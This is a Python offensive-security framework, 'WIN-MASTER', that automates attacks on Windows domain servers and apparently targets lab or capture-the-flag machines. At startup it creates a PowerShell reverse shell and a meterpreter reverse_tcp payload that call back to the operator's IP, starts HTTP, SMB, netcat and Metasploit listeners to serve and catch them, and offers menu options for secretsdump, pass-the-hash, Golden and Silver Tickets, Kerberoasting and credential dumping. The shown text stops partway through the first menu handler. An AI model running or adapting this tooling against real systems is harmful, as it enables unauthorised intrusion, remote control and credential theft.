#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF MICROSOFT SERVERS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import time
import getopt
import os.path
import hashlib
import binascii
import datetime
import requests
import linecache

from termcolor import colored
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check running as root.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   bugHunt = 0
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

maxUser = 5000							# UNLIMITED VALUE

colour0 = "red"							# DISPLAY COLOURS
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"

netWork = "tun0"
dataDir = "DATAFILES"						# LOCAL DIRECTORY
workDir = "WORKFILES"
httpDir = "HTTPFILES"
fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
keyPath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH TO IPACKET

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Obtain the local systems IP address.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create functional subroutines to be called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def testOne():
   if TIP[:5] == "EMPTY":
      print("[" + colored("-", colour7) + "] REMOTE IP has not been specified...")
      return 1
   return 0
   
def testTwo():
   if TIP[:5] == "EMPTY":
      print("[" + colored("-", colour7) + "] REMOTE IP has not been specified...")
      return 1
   if DOM[:5] == "EMPTY":
      print("[" + colored("-", colour7) + "] DOMAIN NAME has not been specified...")
      return 1
   return 0  
   
def testThree():
   if USR[:2] == "''":
      print("[" + colored("-", colour7) + "] USERNAME has not been specified...")
      return 1
   if SID[:5] == "EMPTY":
      print("[" + colored("-", colour7) + "] Domain SID has not been specified...")
      return 1
   return 0

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dotPadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += "."
   return variable

def getTime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = spacePadding(variable, value)
   return variable

def command(variable):
   if bugHunt == 1:
      print(colored(variable, colour5))
   os.system(variable)
   return
 
def prompt():
   selection = input("\nPress ENTER to continue...")
   return
   
def resetTokens():
   command("rm    " + dataDir + "/tokens.txt")
   command("touch " + dataDir + "/tokens.txt") 
   return
   
def saveParams():
   print("[" + colored("+", colour6) + "] Backing up data...")
   with open(dataDir + "/config.txt", "w") as config:
      config.write(DNS + "\n")
      config.write(TIP + "\n")
      config.write(PTS + "\n")
      config.write(WEB + "\n")
      config.write(USR + "\n")
      config.write(PAS + "\n")
      config.write(NTM + "\n")
      config.write(DOM + "\n")
      config.write(SID + "\n")
      config.write(TSH + "\n")
      config.write(LTM + "\n")
      config.write(DIR + "\n")
   return
   
def privCheck():
   command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
   print("[" + colored("*", colour8) + "] Attempting to run secretsdump command...")
   command(keyPath + "secretsdump.py -k " + DOM.rstrip(" "))
   print("\n[*] Attempting to run psexec command...")
   command(keyPath + "psexec.py -k " + DOM.rstrip(" "))
   return 

def keys():
   print("\nRegistry Hives:-\n")
   print("\tHKEY_CLASSES_ROOT   HKCR")
   print("\tHKEY_CURRENT_USER   HKCU")
   print("\tHKEY_LOCAL_MACHINE  HKLM")
   print("\tHKEY_USERS          HKU ")
   print("\tHKEY_CURRENT_CONFIG HKCC")
   return

def display():
   print('\u2554' + ('\u2550')*57 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + colored(" TREADSTONE ",colour1) + (" ")*17 + colored("REMOTE SYSTEM",colour5) +  (" ")*14 + '\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')

# -------------------------------------------------------------------------------------
 
   print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
   if DNS[:5] == "EMPTY":
      print(colored(DNS[:COL1],colour7), end=' ')
   else:
      print(colored(DNS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[0]:
      print(colored(SHAR[0],colour3), end=' ')
   else:
      print(colored(SHAR[0],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[0] == "1":
      print(colored(USER[0],colour3), end=' ')
      print(colored(HASH[0],colour3), end=' ')
   else:
      print(colored(USER[0],colour6), end=' ')
      print(colored(HASH[0],colour6), end=' ')   
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
   if TIP[:5] == "EMPTY":
      print(colored(TIP[:COL1],colour7), end=' ')
   else:
      print(colored(TIP[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[1]:
      print(colored(SHAR[1],colour3), end=' ')
   else:
      print(colored(SHAR[1],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[1] == "1":
      print(colored(USER[1],colour3), end=' ')
      print(colored(HASH[1],colour3), end=' ')
   else:
      print(colored(USER[1],colour6), end=' ')
      print(colored(HASH[1],colour6), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " LIVE PORTS   " + '\u2502', end=' ')
   if POR[:5] == "EMPTY":
      print(colored(POR[:COL1],colour7), end=' ')
   else:
      lastChar = POR[COL1-1]
      print(colored(POR[:COL1-1],colour6) + colored(lastChar,colour0), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[2]:
      print(colored(SHAR[2],colour3), end=' ')
   else:
      print(colored(SHAR[2],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[2] == "1":
      print(colored(USER[2],colour3), end=' ')
      print(colored(HASH[2],colour3), end=' ')
   else:
      print(colored(USER[2],colour6), end=' ')
      print(colored(HASH[2],colour6), end=' ')         
   print('\u2551') 
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " WEB ADDRESS  " + '\u2502', end=' ')
   if WEB[:5] == "EMPTY":
      print(colored(WEB[:COL1],colour7), end=' ')
   else:
      print(colored(WEB[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[3]:
      print(colored(SHAR[3],colour3), end=' ')
   else:
      print(colored(SHAR[3],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[3] == "1":
      print(colored(USER[3],colour3), end=' ')
      print(colored(HASH[3],colour3), end=' ')
   else:
      print(colored(USER[3],colour6), end=' ')
      print(colored(HASH[3],colour6), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " USER NAME    " + '\u2502', end=' ')
   if USR[:2] == "''":
      print(colored(USR[:COL1],colour7), end=' ')
   else:
      print(colored(USR[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[4]:
      print(colored(SHAR[4],colour3), end=' ')
   else:
      print(colored(SHAR[4],colour6), end=' ')   
   print('\u2551', end=' ')
   if VALD[4] == "1":
      print(colored(USER[4],colour3), end=' ')
      print(colored(HASH[4],colour3), end=' ')
   else:
      print(colored(USER[4],colour6), end=' ')
      print(colored(HASH[4],colour6), end=' ')   
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " PASS WORD    " + '\u2502', end=' ')
   if PAS[:2] == "''":
      print(colored(PAS[:COL1],colour7), end=' ')
   else:
      print(colored(PAS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[5]:
      print(colored(SHAR[5],colour3), end=' ')
   else:
      print(colored(SHAR[5],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[5] == "1":
      print(colored(USER[5],colour3), end=' ')
      print(colored(HASH[5],colour3), end=' ')
   else:
      print(colored(USER[5],colour6), end=' ')
      print(colored(HASH[5],colour6), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
   if NTM[:5] == "EMPTY":
      print(colored(NTM[:COL1],colour7), end=' ')
   else:
      print(colored(NTM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[6]:
      print(colored(SHAR[6],colour3), end=' ')
   else:
      print(colored(SHAR[6],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[6] == "1":
      print(colored(USER[6],colour3), end=' ')
      print(colored(HASH[6],colour3), end=' ')
   else:
      print(colored(USER[6],colour6), end=' ')
      print(colored(HASH[6],colour6), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
   if DOM[:5] == "EMPTY":
      print(colored(DOM[:COL1],colour7), end=' ')
   else:
      print(colored(DOM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[7]:
      print(colored(SHAR[7],colour3), end=' ')
   else:
      print(colored(SHAR[7],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[7] == "1":
      print(colored(USER[7],colour3), end=' ')
      print(colored(HASH[7],colour3), end=' ')
   else:
      print(colored(USER[7],colour6), end=' ')
      print(colored(HASH[7],colour6), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
   if SID[:5] == "EMPTY":
      print(colored(SID[:COL1],colour7), end=' ')
   else:
      print(colored(SID[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[8]:
      print(colored(SHAR[8],colour3), end=' ')
   else:
      print(colored(SHAR[8],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[8] == "1":
      print(colored(USER[8],colour3), end=' ')
      print(colored(HASH[8],colour3), end=' ')
   else:
      print(colored(USER[8],colour6), end=' ')
      print(colored(HASH[8],colour6), end=' ')         
   print('\u2551')     
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
   if TSH[:5] == "EMPTY":
      print(colored(TSH[:COL1],colour7), end=' ')
   else:
      print(colored(TSH[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[9]:
      print(colored(SHAR[9],colour3), end=' ')
   else:
      print(colored(SHAR[9],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[9] == "1":
      print(colored(USER[9],colour3), end=' ')
      print(colored(HASH[9],colour3), end=' ')
   else:
      print(colored(USER[9],colour6), end=' ')
      print(colored(HASH[9],colour6), end=' ')      
   print('\u2551')        
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " SERVER TIME  " + '\u2502', end=' ')
   if SKEW == 0:
      print(colored(LTM[:COL1],colour7), end=' ')
   else:
      print(colored(LTM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[10]:
      print(colored(SHAR[10],colour3), end=' ')
   else:
      print(colored(SHAR[10],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[10] == "1":
      print(colored(USER[10],colour3), end=' ')
      print(colored(HASH[10],colour3), end=' ')
   else:
      print(colored(USER[10],colour6), end=' ')
      print(colored(HASH[10],colour6), end=' ')         
   print('\u2551')   
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " WORK FOLDER  " + '\u2502', end=' ')
   if DIR.rstrip(" ") == workDir:
      print(colored(DIR[:COL1],colour7), end=' ')
   else:
      print(colored(DIR[:COL2],colour6), end=' ')
   print('\u2551', end=' ')       
   if SHAR[12][:1] != " ":
      print(colored(SHAR[11],'red'), end=' ')
   else:
      if TSH.rstrip(" ") in SHAR[11]:
         print(colored(SHAR[11],colour3), end=' ')
      else:
         print(colored(SHAR[11],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[11] == "1":
      print(colored(USER[11],colour3), end=' ')
      print(colored(HASH[11],colour3), end=' ')
   else:
      if USER[12][:1] != " ":   
         print(colored(USER[11],colour0), end=' ')
         print(colored(HASH[11],colour0), end=' ')
      else:
         print(colored(USER[11],colour6), end=' ')
         print(colored(HASH[11],colour6), end=' ')   
   print('\u2551')     
   
# -------------------------------------------------------------------------------------

   print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')

def options():
   print('\u2551' + "(0) REMOTE IP Scanner  (10) Re/Set SHARE NAME  (20) GetArch (30) WinDap Search  (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra FTP  (80) FTP     " + '\u2551')
   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set SERVER TIME (21) NetView (31) Lookup SIDs    (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra SSH  (81) SSH     " + '\u2551')
   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) SamDump Users  (42) KerbBruteForce (52) *BloodHound (62) GenListPASS (72) Hydra SMB  (82) SSH ID  " + '\u2551')
   print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) REGistryValues (43) KerbRoasting   (53) *BH ACLPwn  (63) Editor USER (73) Hydra POP3 (83) Telnet  " + '\u2551')
   print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) List EndPoints (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) Hydra TOM  (84) NetCat  " + '\u2551')
   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Client     (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) MSF TOMCAT (85) SQSH    " + '\u2551')
   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Smb Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL   " + '\u2551')
   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) SmbMap SHARE   (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
   print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbCopy Files  (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMap SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("clear")
command("xdotool key Alt+Shift+S; xdotool type 'WIN-MASTER'; xdotool key Return")

print("__        _____ _   _   __  __    _    ____ _____ _____ ____   ")
print("\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \  ")
print(" \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) | ")
print("  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <  ")
print("   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\\")
print("                                                               ")
print("      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)   \n")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Boot the system and initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print("[" + colored("*", colour8) + "] Booting program, please wait...")
print("[" + colored("+", colour6) + "] Using localhost IP address " + localIP + "...")

if not os.path.exists(workDir):
   os.mkdir(workDir)
   print("[" + colored("+", colour6) + "] Directory " + workDir + " created...")
else:
   print("[" + colored("-", colour7) + "] Directory " + workDir + " already exists...")
   
if not os.path.exists(dataDir):
   os.mkdir(dataDir)
   print("[" + colored("+", colour6) + "] Directory " + dataDir + " created...")
else:
   print("[" + colored("-", colour7) + "] Directory " + dataDir + " already exists...")
   
if not os.path.exists(httpDir):
   os.mkdir(httpDir)
   print("[" + colored("+", colour6) + "] Directory " + httpDir + " created...")
else:
   print("[" + colored("-", colour7) + "] Directory " + httpDir + " already exists...")      
   
print("[" + colored("*", colour8) + "] Populating system variables...")

if not os.path.exists(dataDir + "/usernames.txt"):			
   command("touch " + dataDir + "/usernames.txt")
   print("[" + colored("+", colour6) + "] File usernames.txt created...")
else:
   print("[" + colored("-", colour7) + "] File usernames.txt already exists...")
   
if not os.path.exists(dataDir + "/passwords.txt"):			
   command("touch " + dataDir + "/passwords.txt")
   print("[" + colored("+", colour6) + "] File passwords.txt created...")
else:
   print("[" + colored("-", colour7) + "] File passwords.txt already exists...")

if not os.path.exists(dataDir + "/hashes.txt"):			
   command("touch " + dataDir + "/hashes.txt")
   print("[" + colored("+", colour6) + "] File hashes.txt created...")
else:
   print("[" + colored("-", colour7) + "] File hashes.txt already exists...")
   
if not os.path.exists(dataDir + "/shares.txt"):
   command("touch " + dataDir + "/shares.txt")
   print("[" + colored("+", colour6) + "] File shares.txt created...")
else:
   print("[" + colored("-", colour7) + "] File shares.txt already exists...")
   
if not os.path.exists(dataDir + "/tokens.txt"):
   command("touch " + dataDir + "/tokens.txt")
   print("[" + colored("+", colour6) + "] File tokens.txt created...")
else:
   print("[" + colored("-", colour7) + "] File tokens.txt already exists...")

SKEW = 0         							# TIME SKEW
DOMC = 0								# DOMAIN COUNTER
DNSC = 0								# DNS COUNTER
COL1 = 40	 							# SESSIONS
COL2 = 44	 							# SHARE NAMES
COL3 = 23	 							# USER NAMES
COL4 = 32	 							# HASHED PASSWORDS
COL5 = 1								# TOKENS

SHAR = [" "*COL2]*maxUser						# SHARE NAMES
USER = [" "*COL3]*maxUser						# USER NAMES
HASH = [" "*COL4]*maxUser						# PASSWORDS
VALD = ["0"*COL5]*maxUser						# USER TOKEN

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists(dataDir + "/config.txt"):
   print("[" + colored("+", colour6) + "] Configuration file not found - using defualt values...")
   DNS = "EMPTY              "						# DNS NAME
   TIP = "EMPTY              " 						# REMOTE IP
   POR = "EMPTY              " 						# LIVE PORTS
   WEB = "EMPTY              " 						# WEB ADDRESS
   USR = "''                 " 						# SESSION USERNAME
   PAS = "''                 "						# SESSION PASSWORD       
   NTM = "EMPTY              " 						# NTLM HASH
   DOM = "EMPTY              " 						# DOMAIN NAME
   SID = "EMPTY              " 						# DOMAIN SID
   TSH = "EMPTY              " 						# SESSION SHARE
   LTM = "00:00              " 						# LOCAL TIME    
   DIR = workDir	       						# DIRECTORY   
   PTS = POR		       						# FULL PORT LISTING      
else:
   print("[" + colored("+", colour6) + "] Configuration file found - restoring saved data....")
   DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
   TIP = linecache.getline(dataDir + "/config.txt", 2).rstrip("\n")
   POR = linecache.getline(dataDir + "/config.txt", 3).rstrip("\n")
   WEB = linecache.getline(dataDir + "/config.txt", 4).rstrip("\n")
   USR = linecache.getline(dataDir + "/config.txt", 5).rstrip("\n")
   PAS = linecache.getline(dataDir + "/config.txt", 6).rstrip("\n")
   NTM = linecache.getline(dataDir + "/config.txt", 7).rstrip("\n")
   DOM = linecache.getline(dataDir + "/config.txt", 8).rstrip("\n")	
   SID = linecache.getline(dataDir + "/config.txt", 9).rstrip("\n")
   TSH = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
   LTM = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
   DIR = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")      
   PTS = POR  
   
DNS = spacePadding(DNS, COL1)
TIP = spacePadding(TIP, COL1)
POR = spacePadding(POR, COL1)
WEB = spacePadding(WEB, COL1)
USR = spacePadding(USR, COL1)
PAS = spacePadding(PAS, COL1)
NTM = spacePadding(NTM, COL1)
DOM = spacePadding(DOM, COL1)
SID = spacePadding(SID, COL1)
TSH = spacePadding(TSH, COL1)
LTM = spacePadding(LTM, COL1)
DIR = spacePadding(DIR, COL1)

with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
   for x in range(0, maxUser):
      USER[x] = read1.readline()
      HASH[x] = read2.readline()
      VALD[x] = read3.readline()
      SHAR[x] = read4.readline()
      
      SHAR[x] = spacePadding(SHAR[x], COL2)         
      USER[x] = spacePadding(USER[x], COL3)
      HASH[x] = spacePadding(HASH[x], COL4)    
      VALD[x] = spacePadding(VALD[x], COL5)

if DOM[:5] != "EMPTY":
   command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
   DOMC = 1

if":" in TIP:
   IP46 = "-6"
else:
   IP46 = "-4"
   
#-----

print("[" + colored("*", colour8) + "] Creating exploit files...")
command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/meterpreter.exe  > /dev/null 2>&1")

print("[" + colored("*", colour8) + "] Starting HTTP server...")
time.sleep(2)
with open("logo.tmp", "w") as logo:
   logo.write("\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   \n")
   logo.write("\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
   logo.write("\t\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
   logo.write("\t\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  \n")
   logo.write("\t\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
   logo.write("\t\t                                                                                                                    \n")
   logo.write("\t\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               \n\n\n")
   logo.write("ENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		\n")
   logo.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   logo.write("jawsenum.ps1			meterpreter.exe			powerup.ps1			nc64.exe			mimidump.ps1            \n")
   logo.write("sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		\n")
   logo.write("sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		\n")
   logo.write("winpeas32.exe			image.php.jpg			powermad.ps1			test_clsid.bat			lovelypotato.ps1	\n")
   logo.write("winpeas64.exe							procdump32.exe			rogueoxidresolver.exe		roguepotato.exe		\n")
   logo.write("rubeus.exe							procdump64.exe							mimikatz64.exe		\n")
   logo.write("nmapsetup.exe															mimikatz32.exe          \n")
   logo.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")

command("xdotool key Ctrl+Shift+T; sleep 2")
command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 2")
command("xdotool type 'cat logo.tmp'; xdotool key Return")
command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
command("xdotool key Ctrl+Shift+Tab; sleep 2")

print("[" + colored("*", colour8) + "] Starting SMB server...")
time.sleep(2)
command("xdotool key Ctrl+Shift+T; sleep 2")
command("xdotool key Alt+Shift+S; xdotool type 'SMB Server'; xdotool key Return; sleep 2")
command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
command("xdotool key Ctrl+Shift+Tab; sleep 2")
command("xdotool key Ctrl+Shift+Tab; sleep 2")

print("[" + colored("*", colour8) + "] Starting metasploit server...")
time.sleep(2)
with open("meterpreter.rc", "w") as write:
   write.write("use exploit/multi/handler\n")
   write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
   write.write("set LHOST " + localIP + "\n")
   write.write("clear\n")
   write.write("show options\n")
   write.write("run\n")

command("xdotool key Ctrl+Shift+T; sleep 2")
command("xdotool key Alt+Shift+S; xdotool type 'Meterpreter'; xdotool key Return; sleep 2")
command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
command("xdotool key Ctrl+Shift+Tab; sleep 2")
command("xdotool key Ctrl+Shift+Tab; sleep 2")
command("xdotool key Ctrl+Shift+Tab; sleep 2")
time.sleep(5)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()								# PARAM'S SAVED
   command("rm *.tmp")							# CLEAR GARBAGE
   linecache.clearcache()						# CLEARS CACHES
   checkParams = 0							# RESET'S VALUE
   checkFile = ""							# RESET'S VALUE
   LTM = getTime(COL1)							# GET CLOCKTIME
   command("clear")							# CLEARS SCREEN
   display()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[" + colored("*", colour8) + "] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':   
      checkParams = testOne()
      
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
         else:
            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
# -----
         errorCheck = linecache.getline("lsaquery.tmp", 1) 
                 
         if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour0))
            checkParams = 1                       
# -----
         if checkParams != 1:
            print("[" + colored("*", colour8) + "] Attempting to enumerate domain name...")               
            try:
               null,DOM = errorCheck.split(":")
               SID = " "*COL1
            except ValueError:
               DOM = "EMPTY"
            DOM = DOM.lstrip(" ")
            DOM = spacePadding(DOM, COL1)
                  
            if DOM[:5] == "EMPTY":
               print("[" + colored("-", colour7) + "] Unable to enumerate domain name...")
            else:
               print("[" + colored("+", colour6) + "] Found domain...\n")
               print(colored(DOM,colour6))                  
            
            if DOMC == 1:
               print("\n[*] Resetting current domain associated host...")
               command("sed -i '$d' /etc/hosts")
